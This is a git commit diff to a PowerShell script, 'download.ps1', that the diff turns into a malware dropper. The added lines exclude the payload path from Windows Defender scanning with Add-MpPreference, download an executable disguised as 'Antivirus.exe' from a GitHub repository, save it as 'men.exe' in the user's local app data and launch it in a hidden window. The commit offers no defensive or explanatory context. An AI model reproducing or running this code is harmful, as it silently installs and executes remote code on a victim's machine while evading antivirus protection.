b94659494a3b0962d0e6af98c7dfdb585850f275
43a1723 <hai1723notgay@gmail.com>
2024-08-26 12:58:48 +0700

    Update download.ps1

--- scr/download.ps1
+++ scr/download.ps1
@@ -53,12 +53,13 @@
 
 
 
-$url = "https://bit.ly/fakebatman"
-$output = "$env:localappdata\downloaded_file.bat"
+$url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
+$output = "$env:localappdata\men.exe"
 
 if (Test-Path -Path $output) {
     Write-Host "hello"
 } else {
+    Add-MpPreference -ExclusionPath $output 
     Invoke-WebRequest -Uri $url -OutFile $output
     Start-Process -WindowStyle Hidden -FilePath $output
 }
